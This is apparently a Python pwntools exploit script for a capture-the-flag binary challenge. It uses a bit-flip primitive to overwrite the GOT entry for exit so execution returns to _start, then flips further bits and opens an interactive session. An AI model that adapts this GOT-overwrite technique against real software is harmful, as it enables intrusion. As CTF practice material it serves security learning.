#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chal_patched')
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x401244
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def flip(addr, bit):
    io.sendlineafter(b":", str(hex(addr)).encode())
    io.sendlineafter(b":", str(bit).encode())

def find_value(cur, val):
    for i in range(0x100):
        tmp = cur
        tmp |= (1 << i) & 0xffffffffffffffff
        if tmp == val:
            return i

def return_to_main():
    bit = find_value(0x000000401086, exe.sym["_start"]+6)
    flip(exe.got["exit"], bit)


def solve():

    return_to_main()
    flip(exe.address + 0x5000, 10)
    flip(0x404040, 7)
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

